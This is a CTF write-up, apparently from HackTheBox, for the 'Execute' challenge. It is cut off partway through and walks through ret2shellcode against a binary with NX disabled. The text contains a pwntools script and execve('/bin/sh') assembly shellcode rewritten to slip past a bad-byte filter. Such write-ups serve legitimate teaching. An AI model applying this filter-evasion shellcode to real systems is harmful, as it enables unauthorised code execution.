# Execute
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a76f9eac-e18c-4903-866d-87de83421845)


## Lessons Learned:
1. Stack-Based Exploitation.
2. Input bug which leads to direct code execution.
3. Implement ret2shellcode attack.
4. Craft custom shellcode to bypass bad bytes.

## DESCRIPTION:

## STEPS:
1. In this challenge, we're given a 64 bit binary, dynamically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f25e6b28-c6a8-437f-9eeb-a910233a9085)


> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2419960c-7a0c-408f-b15a-22e30567fc39)


2. Interesting! NX is disabled here. Hence it should be easier for us to gain RCE.
3. Upon reviewing the source code, our objective is very straightforward.
4. There is no buffer overflow, we just need to send our shellcode and it shall executed onto the stack.
5. BUT, the problem is there are several filters to our shellcode, which require us to craft our own shellcode.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/30e29a82-0d47-489d-82ab-a37bc286363b)

6. The easiest way to check which bytes is filtered, simply craft basic shellcode then compare which byte match the pattern.

> SCRIPT

```py
from pwn import *

exe = './execute'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = process(exe)

blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
        
shellcode = '''    
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
'''

sc = asm(shellcode)
for byte in sc:
    if byte in blacklist:
        print(f'BAD BYTE --> 0x{byte:02x}')
        print(f'ASCII --> {chr(byte)}')

sh.interactive()
```

#### NOTES:

```
0x68732f6e69622f is a hex representation of strings "/bin/sh".

>>> from pwn import *
>>> print(p64(0x68732f6e69622f))
b'/bin/sh\x00'
>>> 
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fed4fc6d-add2-4362-877b-0674e64ed767)


7. Got several bad bytes and it seems filtered for `/bin/sh` strings, NULL byte, and 59 or execve call.
8. Let's start by manipulate the 59 value. Actually we can just use 0x3a rather than 0x3b then add 1 byte to al (8 bit).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/052f7d17-5df6-40d8-bc3e-2dee49ba34c8)


> UPDATED SHELLCODE

```asm
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
push 0x3a
pop rax
add al, 0x1
syscall
```

#### NOTES:

```asm
To obtain the correct asm instructions is using trial and error. If you pass:

mov rax, 0x3a
add al, 0x1

It shall bypassed the 59 filter, but introduced another bad bytes.
```


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/abd28ea7-6743-4bba-bfeb-af7a6a769908)


9. Great! Now let's try to bypass the NULL byte first.
10. Using the same method as previous to get rid of another bad byte introduced. I used `push` instruction to push the value first onto the stack pointer.
